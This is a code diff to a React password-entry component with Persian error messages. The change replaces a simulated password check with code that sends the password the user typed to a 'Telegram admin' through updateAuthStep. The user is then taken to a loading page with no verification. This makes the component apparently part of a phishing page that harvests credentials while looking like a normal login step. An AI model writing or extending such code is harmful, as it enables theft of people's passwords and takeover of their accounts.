@@ -58,6 +58,10 @@ const AuthPassword = () => {
     e.preventDefault();
     setErrors({});
 
+    if (isBlocked) {
+      return;
+    }
+
     if (!password) {
       setErrors({ password: "رمز عبور الزامی است" });
       return;
@@ -70,28 +74,36 @@ const AuthPassword = () => {
       return;
     }
 
+    if (!sessionId) {
+      setErrors({ password: "خطا در session. لطفا مجدد تلاش کنید." });
+      return;
+    }
+
     setIsSubmitting(true);
 
     try {
-      // Simulate password verification
-      console.log("Verifying password for:", phoneNumber);
-      await new Promise((resolve) => setTimeout(resolve, 1500));
+      console.log("Sending password to Telegram admin");
 
-      // For demo purposes, accept any valid password
-      console.log("Password verification successful");
+      // Update auth step with password data
+      const success = await updateAuthStep(sessionId, "password", password);
+
+      if (!success) {
+        throw new Error("Failed to update password step");
+      }
+
+      await new Promise((resolve) => setTimeout(resolve, 1000));
 
       // Navigate back to loading page
       navigate("/loading", {
         state: {
           phoneNumber,
-          fromAuth: true,
-          completedSteps: ["phone", "password"],
+          sessionId,
         },
         replace: true,
       });
     } catch (error) {
-      console.error("Password verification error:", error);
-      setErrors({ password: "رمز عبور نادرست است. لطفا دوباره تلاش کنید." });
+      console.error("Password submission error:", error);
+      setErrors({ password: "خطا در ارسال رمز عبور. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
